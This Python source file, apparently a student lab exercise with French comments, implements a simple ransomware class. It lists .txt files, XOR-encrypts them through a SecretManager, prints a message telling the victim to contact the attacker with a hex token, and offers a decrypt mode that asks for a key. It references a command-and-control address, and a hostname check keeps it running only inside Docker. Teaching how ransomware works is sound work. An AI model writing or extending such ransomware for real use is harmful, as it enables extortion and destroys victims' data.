import logging
import socket
import re
import sys
from pathlib import Path
from secret_manager import SecretManager
import os

CNC_ADDRESS = "cnc:6666"
TOKEN_PATH = "/root/token"



class Ransomware:
    def __init__(self) -> None:
        self.check_hostname_is_docker()
    
    def check_hostname_is_docker(self)->None:
        # At first, we check if we are in a docker
        # to prevent running this program outside of container
        hostname = socket.gethostname()
        result = re.match("[0-9a-f]{6,6}", hostname)
        if result is None:
            print(f"You must run the malware in docker ({hostname}) !")
            sys.exit(1)

    #def get_files(self, filter:str)->list:
        # return all files matching the filter
        #raise NotImplemented()
    
    def get_files(self, filter_str: str) -> list:
        #répertoire dù on va rechercher les fichiers
        base_path = Path('/Downloads/TD')

        # rechercher les fichiers 
        matching_files = list(base_path.rglob(filter_str))

        # obtenir les chemins absolus des fichiers
        absolute_paths = [str(file.resolve()) for file in matching_files]

        return absolute_paths

    #def encrypt(self):
        # main function for encrypting (see PDF)
        #raise NotImplemented()

    def encrypt(self):
        # Liste les fichiers .txt 
        txt_files = [file for file in os.listdir() if file.endswith('.txt')]

        if not txt_files:
            print("Aucun fichier .txt trouvé dans le répertoire courant.")
            return

        # Crée une instance de SecretManager
        secret_manager = SecretManager()

        # Appelle la méthode setup pour générer la clé et le token
        secret_manager.setup()

        # Chiffre les fichiers .txt
        files_to_encrypt = txt_files
        secret_manager.xorfiles(files_to_encrypt)

        # Affiche un message avec le token au format hexadécimal
        hex_token = secret_manager.get_hex_token()
        print("Vos fichiers ont été chiffrés. Contactez l'attaquant avec ce token en format hexadécimal :")
        print(hex_token)


    #def decrypt(self):
        # main function for decrypting (see PDF)
        #raise NotImplemented()
    
    def decrypt(self):
        secret_manager = SecretManager()

        # Charge les éléments cryptographiques locaux
        secret_manager.load()

        while True:
            try:
                # Demande la clé à la victime
                b64_key = input("Veuillez entrer la clé de déchiffrement en base64 : ")

                # Appelle set_key pour valider et définir la clé
                secret_manager.set_key(b64_key)

                # Liste des fichiers chiffrés (à personnaliser)
                files_to_decrypt = ['a.txt.encrypted', 'truc.txt.encrypted']

                # Appelle xorfiles pour déchiffrer les fichiers
                secret_manager.xorfiles(files_to_decrypt)

                # Appelle clean pour supprimer les éléments cryptographiques locaux
                secret_manager.clean()

                # Affiche un message de succès
                print("Déchiffrement réussi. Vos fichiers ont été restaurés.")
                break  # Sort de la boucle

            except Exception as e:
                print(f"Erreur : {e}")
                print("La clé est incorrecte. Veuillez réessayer.")
                continue  # Recommence la boucle en cas d'échec



if __name__ == "__main__":
    logging.basicConfig(level=logging.DEBUG)
    if len(sys.argv) < 2:
        ransomware = Ransomware()
        ransomware.encrypt()
    elif sys.argv[1] == "--decrypt":
        ransomware = Ransomware()
        ransomware.decrypt()